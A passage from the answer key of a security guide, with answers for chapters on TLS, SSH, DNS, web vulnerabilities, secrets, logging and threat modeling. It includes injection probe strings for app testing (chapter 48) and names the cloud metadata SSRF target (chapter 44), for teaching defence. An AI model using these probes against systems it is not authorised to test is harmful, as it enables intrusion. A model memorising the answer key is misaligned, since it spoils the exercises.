4. Because HTTPS is now near-universal (including on phishing sites), so
   "Secure" was misread as "trustworthy".
5. At the server — often at a load balancer/CDN *before* the app. Everything past
   that point sees plaintext, so logs, backups, and a breached DB are outside
   TLS's protection.

### Chapter 28 — The TLS 1.3 handshake

1. **One** round trip for a full handshake; **zero** for resumption (0-RTT).
2. `CertificateVerify` is a signature over the handshake transcript with the
   cert's private key — it proves the server *holds that private key* for *this*
   session, not just that it has a copy of the certificate.
3. It's an HMAC over the whole transcript from each side — proving both parties
   saw the same handshake, which defeats downgrade and tampering.
4. 0-RTT data is replayable by an attacker who captured it. Only idempotent,
   non-state-changing requests (GET/HEAD) may safely use it.
5. Only the ClientHello and ServerHello (the keys don't exist yet); the SNI is
   visible unless ECH is used. Everything after ServerHello is encrypted.
6. To save a round trip: the client guesses the likely group and sends its
   `key_share` immediately; if it guessed wrong the server sends a
   HelloRetryRequest.

### Chapter 29 — Certificates and validation

1. The **Subject Alternative Name** (SAN) DNS entries. If absent, modern clients
   reject the certificate (the CN is ignored).
2. The server sends **leaf + intermediate(s)**; the client already has the
   **root** in its trust store.
3. Any five of: valid signature chain to a trusted root; hostname matches a SAN;
   current time within validity for every cert; correct basicConstraints
   (CA:TRUE on non-leaves, CA:FALSE on leaf); key usage / EKU permits serverAuth;
   not revoked; (browsers) sufficient CT SCTs.
4. `*.example.com` matches `a.example.com` but **not** `example.com` and **not**
   `a.b.example.com` (one label only).
5. **DV** proves control of the domain — nothing about who runs it. **EV** adds
   vetting of the legal entity; browsers dropped the special EV UI because users
   ignored it and it gave false assurance.
6. Chrome caches intermediates it has seen before, so a server that omits the
   intermediate still works there; `curl` and other clients that don't cache
   fail.

### Chapter 30 — PKI, CT, revocation, ACME

1. Any of the ~50 trusted CAs can issue a certificate for any domain, so your
   security depends on all of them. Mitigations: **CAA records** (restrict which
   CA may issue) and **CT monitoring** (detect issuance you didn't request).
2. It makes mis-issuance **publicly detectable** (usually within minutes). It
   does **not** prevent issuance or encrypt anything.
3. Most clients **soft-fail**: if the OCSP responder is unreachable they proceed,
   so an attacker who can MITM just blocks OCSP. Replaced in practice by
   **short-lived certificates** and browser-pushed revocation lists (CRLSets /
   CRLite).
4. Client asks CA for a cert for `example.com`; CA returns a token; client serves
   it at `http://example.com/.well-known/acme-challenge/<token>`; CA fetches it
   from multiple vantage points; on success, issues a ~90-day cert; client
   auto-renews at ~60 days.
5. A **CAA** DNS record lists which CAs may issue for the domain; every CA is
   **required** to check it before issuing.
6. **DigiNotar** (2011, hacked, issued fake `*.google.com`) and **Symantec**
   (2017–18, years of misissuance) — both removed from root stores.

### Chapter 31 — TLS in production

1. **Edge termination** (LB/CDN): plaintext from the LB to the app unless
   re-encrypted. **App termination**: encrypted to the process. **Re-encrypt /
   mesh**: every hop is TLS/mTLS — no plaintext in transit.
2. For service-to-service auth, API clients, admin access, IoT fleets, partner
   integrations. Burden: you now run a mini-PKI — issuing, rotating, and revoking
   client certs.
3. HSTS defeats **sslstrip** (an attacker downgrading your redirect to HTTP). Gap:
   the **first visit** before any HSTS header is seen — closed by the browser
   **preload list**.
4. Any five: disabled cert verification (`-k` / `verify=False` /
   `rejectUnauthorized:false` / no-op TrustManager); mixed content; missing
   intermediate; wildcard shared across trust boundaries; private key in git /
   world-readable; key reused across renewals; TLS 1.0/1.1 enabled; cert missing
   www or apex; trusting `X-Forwarded-*` from anywhere.
5. Powerful: it defeats a mis-issued or rogue-CA certificate outright. Dangerous:
   if you rotate keys/CAs without a shipped backup pin, the app bricks itself.
   Rules: pin a CA/intermediate SPKI (not the leaf); always ship ≥2 pins
   including an offline backup; set an expiry and a killswitch.
6. Because anyone who can reach the app directly can spoof the header, forging
   the client IP and bypassing "HTTPS-only" / IP-allowlist checks. Only trust it
   from the known LB.

### Chapter 32 — Inspecting TLS

1. `</dev/null` (or type `Q`) stops it hanging; `-servername <host>` sets SNI.
2. Compare the public keys: `openssl x509 -in cert -noout -pubkey` and
   `openssl pkey -in key -pubout` must be identical.
3. `openssl s_client -connect host:443 -tls1_1` — it should fail now.
4. Any five: TLS 1.3 + 1.2 only; AEAD-only ciphers; forward secrecy on all
   suites; cert not near expiry with correct SANs and complete chain; sane key
   size and SHA-256 signature; no known vulns (Heartbleed/ROBOT/POODLE/…); HSTS
   present; OCSP stapling on.
5. No — BREACH is HTTP-response compression plus secrets in the body. Fix it at
   the app (disable compression on sensitive responses, mask CSRF tokens), not in
   TLS config.

### Chapter 33 — SSH and the connection protocol

1. **Transport** (key exchange, server auth via host key, encrypted records),
   **user authentication** (proves who the client is), **connection** (multiplexes
   channels: shells, forwards, SFTP).
2. The **server** is authenticated first (in the transport layer), then the user
   authenticates inside the encrypted channel.
3. Rely on **publickey**; disable **password** authentication on internet-facing
   hosts.
4. It has defaulted to a post-quantum hybrid key exchange
   (`sntrup761x25519` since OpenSSH 9.0, `mlkem768x25519` in OpenSSH 10), so
   recorded sessions resist future quantum decryption.
5. `ssh -D` opens a local **SOCKS proxy** that routes arbitrary TCP through the
   remote host; `ssh -L` forwards **one specific** remote service to a local
   port.

### Chapter 34 — Keys, agents, host verification

1. **Ed25519** — small, fast, no parameter footguns, and it avoids ECDSA's
   per-signature `k` nonce risk.
2. The agent holds decrypted private keys in memory and signs on request (unlock
   once per session). **Agent forwarding** (`-A`) exposes that signing capability
   to the remote host — anyone with root there can authenticate as you.
3. **`ProxyJump` / `-J`** — the jump host only forwards bytes and never sees your
   keys or agent.
4. **TOFU** = trust the host key on first connection, pin it in `known_hosts`,
   and compare on every later connection. Weakness: an attacker on-path during
   that *first* connection gets their key pinned. Remove the prompt via
   config-management-distributed `known_hosts`, SSHFP+DNSSEC, or an SSH CA
   (`@cert-authority`).
5. `restrict` = deny all SSH features, then add back only what's listed.
   `command="..."` forces a single command regardless of what the client
   requests — the basis of locked-down deploy/backup accounts.

### Chapter 35 — SSH certificates, hardening, bastions

1. It's O(users × hosts) entries to keep in sync, with stale keys lingering and
   painful re-TOFU on rebuilds. Replace `authorized_keys` with **user
   certificates** (CA-signed, short-lived) and `known_hosts` with **host
   certificates** (one `@cert-authority` line).
2. `@cert-authority *.example.com <CA public key>` — any host presenting a valid
   cert for its name is then trusted.
3. A leaked cert simply expires within hours (`-V +8h`), so there's rarely
   anything to revoke; a KRL covers the rare urgent case.
4. Any five: `PermitRootLogin no`; `PasswordAuthentication no`;
   `AuthenticationMethods publickey` (or add MFA); `AllowGroups` allowlist;
   `AllowTcpForwarding no` / `AllowAgentForwarding no` on app servers; modern
   `KexAlgorithms`/`Ciphers`/`MACs`; `MaxAuthTries 3`; `LogLevel VERBOSE`.
5. `-J` routes through the bastion without exposing your keys or agent to it;
   `-A` forwards your agent socket to the bastion, letting a compromised bastion
   act as you.

### Chapter 36 — SSH hands-on

1. `ProxyJump` = transparently connect via a bastion; `IdentitiesOnly` = offer
   only the named key (avoids "too many auth failures"); `ControlMaster` = reuse
   one TCP connection for multiple sessions.
2. `-L 5433:db:5432 host` = reach a remote DB via `localhost:5433`; `-R
   8080:localhost:3000 host` = expose your local :3000 on the remote's :8080
   (demos/webhooks); `-D 1080 host` = SOCKS proxy to reach an internal network.
3. `ssh-keygen -Y sign -f key -n <namespace> file` then `ssh-keygen -Y verify -f
   allowed_signers -I <id> -n <namespace> -s file.sig < file`. The `-n` namespace
   scopes what the signature means (e.g. `file`, `git`) so a signature can't be
   replayed in a different context.
4. Wrong key / key not in `authorized_keys` / **file permissions too open**
   (`~/.ssh` must be 700, private key 600, and HOME not group-writable).
5. `sudo sshd -t`.

### Chapter 37 — The network attacker

1. **Passive on-path**: reads only → defeat with encryption. **Active on-path
   (MITM)**: reads/modifies → defeat with authentication + integrity. **Off-path**:
   must spoof/guess → defeat with randomised IDs and ingress filtering.
2. ARP has no authentication, so a forged "the gateway is at my MAC" is believed.
   **Dynamic ARP Inspection** (with DHCP snooping) drops replies that don't match
   a trusted binding.
3. Either a cert from a CA whose root is in the victim's trust store (e.g. a
   corporate inspection root on a managed device) or a genuine mis-issued cert
   (which CT would surface quickly). A self-signed/wrong-name cert is refused with
   no click-through.
4. The employer installs its own root CA on managed devices; its proxy then
   presents certs it signs for any site. The padlock is technically real (valid
   chain to a trusted root), but the proxy is reading the traffic.
5. An AS announces IP prefixes it doesn't own, detouring traffic through it. Real
   incident: the 2018 Amazon Route 53 / MyEtherWallet hijack (crypto theft).

### Chapter 38 — DNS security

1. Any three: stub↔recursive (on-path spoof, rogue DHCP, edited resolv.conf);
   recursive↔authoritative (off-path cache poisoning); the recursive's cache /
   a compromised resolver; the registrar/registry account (domain hijack); the
   authoritative server or zone.
2. Every guess is a fresh race, and a winning spoof can poison an NS record for
   the whole zone. Mitigations: source-port randomisation and 0x20 case
   encoding — they raise the entropy but don't authenticate the answer, so
   they're not a true fix. DNSSEC is.
3. Data-origin authentication and integrity for DNS records (plus authenticated
   denial of existence). It does **not** encrypt anything, and it doesn't protect
   the stub↔recursive hop unless that resolver validates and you trust it.
4. **DoT** = port 853, a dedicated port (easy to see and block, content
   encrypted). **DoH** = port 443, blends with web traffic (hard to block, also
   bypasses enterprise DNS controls). Trade-off: network privacy vs.
   operator/enterprise visibility.
5. **Registry Lock**: a manual, out-of-band step required to change NS records or
   transfer the domain — stops registrar-account compromise / social-engineering
   domain hijacks.
6. A DNS record (often a CNAME) pointing at a decommissioned third-party resource
   (S3 bucket, Heroku app). An attacker who claims that resource gets
   **subdomain takeover**.

### Chapter 39 — Firewalls, segmentation, zero trust, VPNs

1. A stateful firewall tracks connection state, so it can allow return traffic
   for connections it permitted outbound without a separate rule (and drop
   unsolicited/invalid packets).
2. Blast-radius control — a compromise in one segment can't freely reach the
   others.
3. **Never trust, always verify**: no implicit trust from network location; every
   request to every resource is authenticated and authorised per-session.
   Castle-and-moat trusts everything "inside" the perimeter.
4. Good for: authenticated encrypted tunnels over untrusted networks, remote
   access, site-to-site links. Not: anonymity; a substitute for endpoint
   security or app authorization; "zero trust".
5. It removes negotiation, so there's no downgrade attack and no misconfiguration
   of weak suites; you revise the whole protocol version instead.
6. `AllowedIPs` is both the **routing rule** (which peer gets which destination
   IPs) and the **ACL** (which source IPs are accepted from that peer).

### Chapter 40 — Seeing the network

1. `'(udp port 53 or (tcp port 443 and host 10.0.0.5)) and not port 22'`.
2. A **capture filter** (BPF, e.g. `tcp port 443`) decides what's recorded; a
   **display filter** (Wireshark syntax, e.g. `tls.handshake.type == 1`) decides
   what's shown from an existing capture. Different languages.
3. Run the client with `SSLKEYLOGFILE` set, then point Wireshark's TLS
   (Pre)-Master-Secret log file at it.
4. `-sV` gives service versions; `-sC` (or `--script default`) runs the default
   script set.
5. **HSTS** — it makes the browser refuse the plaintext connection sslstrip
   needs, so the downgrade never happens.

### Chapter 41 — How the web decides what to trust

1. Scheme + host + port. `http://x` and `https://x` are **different** origins
   (scheme differs).
2. `evil.example` can send requests to `bank.example` (with cookies), and embed
   its images/scripts/frames — but it **cannot read** the response body, cookies,
   storage, or framed DOM.
3. `Secure` = only sent over HTTPS; `HttpOnly` = JavaScript can't read it (blunts
   cookie theft via XSS); `SameSite` = not sent on cross-site requests (blunts
   CSRF).
4. No — the spec forbids `*` with credentials, and the usual underlying mistake
   is **reflecting the `Origin` header** without an allowlist, which is
   effectively the same thing.
5. No. CORS is a *browser* mechanism; a Python script (or curl) ignores it
   entirely. Your API still needs real authn/authz on every endpoint.

### Chapter 42 — Injection

1. Keep code and data on **separate channels** — parameterise, never concatenate
   untrusted input into a string an interpreter will parse.
2. `execute("... WHERE id = ?", [id])` — the query structure is fixed and `id` is
   bound as data.
3. Identifiers (table/column names), `ORDER BY` targets, `LIMIT` in some drivers.
   Validate them against a strict **allowlist** of known-good values.
4. Use the array/`execFile` form that passes arguments directly to the program
   with no shell (`subprocess.run(["ping","-c","1",host])`), and still validate
   the value.
5. Input that was stored safely, then later concatenated into a query when it's
   read back — so *every* query must be parameterised, not just the ones handling
   direct input.

### Chapter 43 — XSS

1. **Stored** (payload persisted server-side, hits every viewer), **reflected**
   (payload echoed from the request, needs a lure), **DOM-based** (client JS
   moves attacker input into a dangerous sink, no server involvement).
2. Any four: make authenticated requests as the user; read the DOM/page; read
   `localStorage`/`sessionStorage` and non-HttpOnly cookies; keylog and phish
   with a fake overlay; pivot to internal APIs; persist via a service worker.
3. Encoding untrusted data for the exact context it lands in (HTML body vs
   attribute vs JS vs URL vs CSS) — each has different rules, so one encoding
   isn't enough; data in a `javascript:` URL or a `<script>` block can't be made
   safe by HTML-encoding at all.
4. `'unsafe-inline'` and `'unsafe-eval'` (and broad host allowlists that host
   JSONP/old Angular). A weak CSP uses those; a strong one is nonce/hash-based or
   `strict-dynamic`.
5. Sanitise with a vetted allowlist library (**DOMPurify**) permitting only
   specific tags/attributes — never a homemade regex.

### Chapter 44 — CSRF, SSRF, clickjacking

1. SOP lets the browser *send* cross-origin requests (with cookies) but not
   *read* the response. CSRF still works because the attacker only needs the
   **side effect** (the transfer happens), not the response body.
2. Defences: `SameSite` cookies; anti-CSRF **synchronizer tokens**; requiring a
   custom header (forces a preflight); re-auth for sensitive actions. Gap in
   `SameSite=Lax`: it's still sent on **top-level GET navigations** (and there
   are same-site-subdomain and non-cookie-auth caveats).
3. `http://169.254.169.254/...` — the cloud instance metadata service. The
   **Capital One** breach (2019) used SSRF to it to steal IAM credentials.
4. Blocklists miss `0.0.0.0`, `[::1]`, decimal/octal IPs, DNS names that resolve
   to private ranges, redirects, and DNS rebinding. Right approach: allowlist
   destinations and schemes, then resolve the host and check the **resulting IP**
   against private/loopback/link-local/metadata ranges — **before connecting and
   after every redirect**.
5. **`Content-Security-Policy: frame-ancestors 'none'`** (keep `X-Frame-Options:
   DENY` for old browsers).

### Chapter 45 — Broken access control

1. **IDOR/BOLA**: accessing another user's object by changing its identifier
   because the app checks authentication but not ownership. UUIDs don't fix it
   because they leak (URLs, Referer, logs, other endpoints) — unguessable ≠
   authorised.
2. **Vertical** = gaining a higher privilege level (user → admin). **Horizontal**
   = accessing a peer's data at the same level (user A → user B).
3. Binding a whole request body to a model so the client can set fields it
   shouldn't (`role`, `credits`). Fix: an explicit allowlist of updatable fields
   (a DTO).
4. The client is attacker-controlled, so UI restrictions and hidden routes mean
   nothing — the API is the boundary. Centralising it (one policy layer) prevents
   the inconsistent, missed ad-hoc checks that cause breaches.
5. `SELECT * FROM orders WHERE id = ? AND customer_id = :current_user`. Return
   **404** rather than 403 so you don't confirm the object exists (enumeration).
6. Because the client is attacker-controlled — recompute every monetary value
   server-side from stored prices and validate coupons server-side.

### Chapter 46 — Authentication and identity

1. **Stateful sessions**: trivially revocable and inspectable (drawback: needs a
   shared store). **Stateless JWTs**: scale without a lookup (drawback: hard to
   revoke, footgun-rich, claims readable by the client).
2. **Session fixation**: an attacker fixes a victim's session ID before login and
   reuses it after. Fix: regenerate the session ID on login / privilege change.
3. Any three: `alg:none` (pin the algorithm, reject none); RS256→HS256 confusion
   (pin alg, use separate verify APIs); weak HMAC secret (long random key);
   missing `exp`/`aud`/`iss` checks (validate all); token in `localStorage` (XSS
   reads it — use a cookie with flags); no revocation (keep them short-lived +
   denylist).
4. **OIDC** authenticates the user (OAuth 2.0 only authorises resource access).
   Use the **Authorization Code flow with PKCE** for all clients; PKCE prevents
   authorization-code interception.
5. WebAuthn credentials are **bound to the origin** and use a cryptographic
   challenge-response, so a phishing site on a different origin can't use them.
   TOTP codes can be relayed in real time to the real site.
6. Because "reset via email" makes email the true root of trust — recovery is
   often weaker than primary auth. Standard: make recovery as strong as primary
   auth (or deliberately weaker, with monitoring).

### Chapter 47 — Supply chain

1. In the **transitive** dependencies — the hundreds you didn't choose and don't
   review, any of which can run install-time code and ship to prod.
2. Publishing a public package with the same name as a company's private one and
   a higher version, so the resolver picks the public (malicious) one. Prevent
   with scoped names / an explicit private index with no public fallback / a
   pull-through proxy allowlist.
3. A **Software Bill of Materials** — a complete component+version inventory per
   build — so when a CVE drops you can answer "are we affected?" in minutes.
4. Tags are **mutable** — the same tag can be repointed to malicious code later.
   A digest/SHA pins the exact artifact.
5. The **build system** itself was compromised, so the officially **signed**
   artifact was backdoored — signing the release doesn't help if the pipeline is
   owned. Protect the build, not just the release step.
6. e.g. Python `pickle.load` / PyYAML `yaml.load` (unsafe), Java
   `ObjectInputStream`, PHP `unserialize`, .NET `BinaryFormatter` — all can lead
   to RCE on untrusted data. Use JSON / schema-validated formats (or
   `yaml.safe_load`).

### Chapter 48 — Testing a web application

1. A proxy (Burp/ZAP) between browser and app that lets you inspect, modify, and
   replay every request — the core tool because it makes the app's real
   interface visible and manipulable.
2. **Broken access control.** Technique: create two accounts (A and B); for every
   object/endpoint A can use, replay the request as B and as anonymous; change
   IDs.
3. `' " ` \ ; < >` and a URL/`{{7*7}}`/`../` — quotes/semicolons hint at SQL or
   command injection (errors, timing), `<`/`>` at XSS (check the reflection
   context), `{{7*7}}`→`49` at template injection, `../` at path traversal, a URL
   param at SSRF.
4. Any three: verbose errors / stack traces; exposed `.git/`, `.env`, backup
   files; debug endpoints (`/actuator`); directory listing; default credentials;
   outdated JS libraries (retire.js); missing security headers.
5. Title; severity (CVSS + business impact); affected endpoint/params;
   reproducible steps with request/response evidence; root cause; specific
   remediation; references — and a retest result after the fix.

### Chapter 49 — Secrets management

1. Any four: CI/CD logs; container image layers (ARG/ENV, `docker history`);
   client-side bundles/binaries; application logs and APM; Slack/Jira/wiki/
   screenshots; DB dumps and VM snapshots; environment variables (via `/proc`,
   crash dumps, child processes).
2. Best → worst: **Vault dynamic credential** → **encrypted file at rest** →
   **env var** → **hard-coded**.
3. A credential minted on demand with a short TTL (e.g. a DB user that
   self-destructs in an hour), so a leaked one is useless almost immediately —
   limiting blast radius.
4. Create the new secret alongside the old; deploy consumers to accept **either**;
   switch producers to the new; confirm the old is unused; revoke the old. Keep
   two versions live so rotation is routine.
5. **Rotate/invalidate the secret immediately** — assume it's compromised. Then
   investigate and clean history. Deleting the commit is not remediation.

### Chapter 50 — Logging, detection, monitoring

1. Any six of: authentication events, authorization denials, input-validation
   rejections, account lifecycle, sensitive data access/export, config/deploy
   changes, integrity failures, system events. Every event: UTC ISO-8601
   timestamp, user ID, source IP, user-agent, request ID, action, outcome.
2. Passwords, session tokens, API keys, full JWTs, MFA codes/secrets, full card
   numbers / CVV, raw national IDs, full sensitive request bodies. Prevent by
   redacting at the logging boundary (field allowlist, hash identifiers, mask
   PANs) and neutralising newlines/control chars (log injection).
3. **Central** so an attacker on one host can't erase the evidence;
   **append-only** so it can't be altered; **time-synced** (NTP) so events across
   systems can be correlated.
4. A good alert is actionable and means "attack in progress" (low false-positive
   rate). Besides the rule it needs a **runbook** — what to check, how to triage,
   when to escalate.
5. **Detection-as-code** = detection rules kept in version control,
   peer-reviewed, and tested (e.g. Sigma). Mapping to **ATT&CK** shows your
   coverage and the gaps.

### Chapter 51 — Incident response

1. Preparation, Detection & Analysis, Containment, Eradication, Recovery,
   Post-incident. **Preparation** consumes most of the effort.
2. Pulling the network stops the bleeding while preserving RAM (keys, live
   malware, processes) for forensics. Power off when you must stop something
   irreversible fast — e.g. active ransomware encryption.
3. CPU registers/cache → RAM → network state → running processes → disk →
   logs/archives → physical config (most volatile first).
4. A documented record of who handled which evidence, when, and why — it keeps
   the evidence admissible and the timeline trustworthy.
5. At the point you **become aware** of a personal-data breach — not when you
   fully understand it (GDPR: 72 hours from awareness).
6. It focuses on **systemic** causes, not individuals. Blame makes people
   withhold information in the next incident, which makes you slower and blinder.

### Chapter 52 — Threat modeling and secure design

1. What are we building? What can go wrong? What are we going to do about it? Did
   we do a good job?
2. **S**poofing → authentication/mTLS/signatures; **T**ampering → integrity
   (AEAD/HMAC/signatures), access control; **R**epudiation → audit logging,
   signatures; **I**nformation disclosure → encryption, least privilege,
   redaction; **D**enial of service → rate limits, quotas, timeouts,
   input-size caps; **E**levation of privilege → authz on every request,
   sandboxing, least privilege, no injection.
3. Where data crosses between different trust levels or owners. Threats cluster
   there because that's where trust assumptions change and where input becomes
   "trusted".
4. Any five: **least privilege** (minimum rights, minimum time); **fail-safe
   defaults** (deny by default); **defense in depth** (no single control
   trusted); **complete mediation** (check every access every time); **economy of
   mechanism** (keep the security-critical part small); **open design** (security
   in the key, not the design); **separation of privilege** (require two
   conditions); **psychological acceptability** (make the secure path the easy
   path).
5. Recompute the price/total server-side from stored data and ignore any
   client-supplied amount. It's primarily **T**ampering (and an insecure-design
   flaw).
6. Mitigate (add a control), eliminate (remove the feature/data), transfer (shift
   it to someone else, e.g. a managed service), or accept (document it, with
   sign-off, an owner, and a review date).

---

*End of guide. You started at "what is a byte" and finished able to threat-model
a system, run a PKI, harden a host, break and fix an app, and plan a
post-quantum migration. Keep the lab. Read primary sources. Break your own things
first. Use it to defend.*
<!-- MARKER: END OF GUIDE -->
